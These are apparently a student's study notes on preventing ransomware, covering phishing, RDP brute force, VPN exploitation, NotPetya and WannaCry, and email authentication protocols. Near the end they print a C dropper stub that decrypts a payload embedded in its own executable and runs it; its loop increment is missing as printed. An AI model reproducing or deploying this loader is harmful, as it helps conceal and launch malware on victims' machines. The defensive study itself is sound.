Date: 2026-01-21
Topics: #ransomware #cybersecurity 
Link: 
Class: [[]]

---
# **Ransomware General Notes**

![[../../../2_Images/ransomware_prevention_using_trace.jpg|ransomware_prevention_using_trace.jpg]]

**Definition:** Ransomware is a type of malware which is used to encrypt files and block essential services of the organisation / person after infecting the system.

This document will detail, how we can use **TRACE** to prevent ransomware attacks for **IT & OT** environments.

## **Most Common Attack Vectors for Ransomware Attacks**

### **IT**

- Email Phishing

### **OT**

- RDP brute force  
- VPN Tunneling

For **IT** environments, the most common ransomware attacks are done via **email phishing.**  
The documentation for email phishing is linked here [phishing prevention for ransomware](?tab=t.2uu4mh1w1k9).

## **Case Study on Previous Famous OT Attacks**

### **1\. NotPetya (2017)**

**What it was:** A destructive malware attack known as a **wiper**, ie data could not be recovered.

**Who was affected:** Mainly Ukrainian organizations at first, then global companies like Maersk, Merck, and FedEx.

**How it spread:**

* Initial infection via a compromised Ukrainian accounting software update.  
* Then spread **laterally across networks using SMBv1**, exploiting the **EternalBlue** vulnerability (leaked NSA exploit).

**Impact:** Caused **billions of dollars in damage**, shutting down operations worldwide.

### **2\. WannaCry (2017)**

**What it was:** A true ransomware attack that encrypted files and demanded Bitcoin payments.

**Who was affected:** Over 200,000 systems in 150+ countries, including hospitals (UK NHS).

**How it spread:**

* Used **SMBv1’s EternalBlue** vulnerability to automatically propagate like a worm.

**Impact:** Crippled **healthcare, transportation, and businesses** globally.

## **Study about IT Attack Vectors I’m focused on**

### **Email Phishing**

**Definition:** Phishing is a cyberattack that aims to steal sensitive data from the victims by tricking them into believing they are a legitimate source. One method of achieving this is **spoofing**.

There are 3 facets to conducting a phishing attack

1. **Psychological:** Coercing the victim to make a mistake by manipulating their emotions with text.   
   1. **Examples:** Telling older people that their essential services like banking, is about to stop unless they login, Telling an employee that their boss is requesting credentials for some important application, etc  
2. **Technological:** Trying to seem like a genuine source by manipulating technical components   
   1. **Examples:** Manipulating **SPF(sender policy framework)** to show them to be a geniune source  
3. **Evasion and Delivery:** Finding new ways to evade security checks currently put in place,  
   1. **Examples:** Manipulating file formats to bypass **Mark-of-the-Web** controls

Therefore we will need to monitor the following aspects to understand the phishing patterns

* **Headers**  
* **Links**  
* **Attachments**  
* **Social engineering techniques**

#### **Algorithm to conduct an Email Phishing Attack**

1. Generate a phishing email, either while targeting the victim specifically or making a spray and pray template to target a large volume of potential victims  
2. Generate either a special attachment with embedded code inside it to activate when the user clicks on the attachment or use social engineering inside the email to force the user to reveal sensitive information  
3. Once sensitive information is received attacker can penetrate further and then release malicious payload or if the embedded code is activated it will build and release the payload itself

#### **How to prevent an Email Phishing Attack**

1. Use authentication protocols like **SPF(sender policy framework), DKIM(domain key identified mail), DMARC(Domain-based Message Authentication, Reporting, and Conformance)** to prevent spoofing and checking if the domain name is authentic  
2. Use **SEG (Secure Email Gateway)**  to check the email against known threat signatures, which filters the suspicious mails out

| Protocol | Explanation | Checks | Example of success/failure |
| :---- | :---- | :---- | :---- |
| **SPF** | Its a list of servers that are allowed by the domain to send mails on their behalf | It checks if the mail is sent by the one of the servers which is authorized to do so by the domain | For ex, assume attacker owns [google-support.com](http://google-support.com) domain and he sends an email from an id like [support@google-support.com](mailto:support@google-support.com) the user thinks the mail is from google but in reality its not. |
| **DKIM** | Its a signature done by the owner of the domain to verify the validity of the email | Each domain provides a public key available via dns which can be used to match the private key signature to check validity. It checks if the domain key was altered or not.  | Similar to the abovementioned example, if the attacker owns [google-support.com](http://google-support.com) domain then he can obviously sign malicious emails sent by this domain so the user is only sure that the mail came from this domain but not about the content. This is the reason why phishing is still so prevalent. |
| **DMARC** | Its a policy that tells user how to check if spf and dkim are correct and how to handle the mail if they are not connected. | It checks if the above mentioned protocols are being followed or not. However these are very preliminary checks which are unable to stop social engineering attacks |  |

## **Study about OT Attack Vectors I’m focused on**

### **RDP Brute Force**

**Definition:** RDP short for Remote Desktop Protocol is a Microsoft-developed technology that lets you graphically control another computer over a network, essentially bringing its desktop to your screen.

#### **Algorithm to conduct a RDP brute force attack**

1. Switch RDP on the machine  
2. Obtain the IP address of the machine  
3. Perform a brute force attack to guess the username and password of the machine  
4. If the password and username match then the bruteforce is a success and the machine can now be operated remotely

#### **How to prevent a RDP brute force attack**

1. Stop RDP protocol or move it to internal server only and dont let it connect to the internet  
2. Use Multi Factor Authentication (MFA)  
3. Limit the number of guesses allowed for bruteforce this is called as a **lockout policy**  
4. Use a very strong password to reduce chance of brute force working

### **VPN Exploitation**

**Definition:** VPN exploitation  is using stolen credentials or using known vulnerabilities in unpatched VPN software to access the remote servers or client environment no directly connected to the internet and protected by the gateway

#### **Algorithm to conduct VPN exploitation**

1. Setup a VPN gateway one ethernet to connect to internet another to connect to the local environment  
2. Access the VPN gateway by  
   1. Obtaining leaked credentials for the VPN gateway and obtain access to the local environment   
   2. figure out some vulnerabilities in the service, abuse that service to gain some access and create some sort of backdoor to maintain constant access   
3. Now that access is created we can either begin lateral movement or start dumping malware code from, or move important information to c2 (command and control) server 

#### **How to prevent vpn exploitation** 

1. Use MFA  
2. Block known bad actors   
3. Set up a role based permission system with security directly proportional to the importance of the role  
4. Regularly patch vpn services.  
5. Restrict outbound service from VPN users

## **Ransomware Payload** 

The ransomware payload structure can mostly be categorised in this format

1. Header(mandatory)  
2. Stub (mandatory) maybe decrypt files or maybe used to get files from the internet  
3. Encrypted file(not mandatory if the stub gets the ransomware from the internet)

This is an example of stub code that i found on the internet for downloading ransomware  

```c
\#include \<sys/stat.h\>  
\#include \<windows.h\>  
\#include \<stdio.h\>  
\#include \<io.h\>  
\#include \<process.h\>

\#define MySize 19856

FILE \*mySelf, \*tmpFile;  
struct stat myStat;  
char myName\[MAX\_PATH\], tmpName\[MAX\_PATH\];  
int embedSize, x;  
char \*myByte, \*modeByte, \*cByte;

int main()  
{  
    GetModuleFileName(NULL, myName, sizeof(myName));  
    stat(myName, \&myStat);  
    embedSize=myStat.st\_size-MySize;  
    mySelf=fopen(myName, "rb");  
    lseek(fileno(mySelf), MySize, SEEK\_SET);  
    tmpnam(tmpName);  
    tmpFile=fopen(tmpName, "wb");  
    myByte=(char \*)malloc(1);  
    modeByte=(char \*)malloc(1);  
    cByte=(char \*)malloc(1);  
    fread(modeByte, 1, 1, mySelf); /// Crypt mode  
    fread(cByte, 1, 1, mySelf);     // Crypt byte  
    for(x=0; x\<embedSize; x  )  
    {  
        fread(myByte, 1, 1, mySelf);  
        if(\*modeByte==0x01)  
            \*myByte-=\*cByte;  
        if(\*modeByte==0x02)  
            \*myByte^=\*cByte;  
        fwrite(myByte, 1, 1, tmpFile);  
    }  
    fclose(mySelf);  
    fclose(tmpFile);  
    char \*execPath\[2\];  
    execPath\[0\]=tmpName;  
    execPath\[1\]=NULL;  
    execve(execPath\[0\], execPath, NULL);

    return 0;  
}
```


## **Glossary**

1. **SPF (Sender Policy Framework):** Allows domain owners list authorized mail servers in a DNS TXT record, so receiving servers can check if an email comes from a legitimate source, preventing spoofing and marking fakes as spam or rejecting them  
2. **DKIM (Domain key identified mail):** Enables domain owners to automatically "sign" emails from their domain, and a public key is released for that domain which is able to check if the email is signed by the domain its coming from.  
3. **DMARC (Domain-based Message Authentication, Reporting, and Conformance):** Tells a receiving email server what to do given the results after checking SPF and DKIM. A domain's DMARC policy can be set in a variety of ways — it can instruct mail servers to quarantine emails that fail SPF or DKIM (or both), to reject such emails, or to deliver them.  
4. **SEG (Secure Email Gateway):** This is a checkpoint between the sender and the receiver which checks the email for malicious content using signature based rulesets, like a suricata engine. It then sends suspicious emails to spam
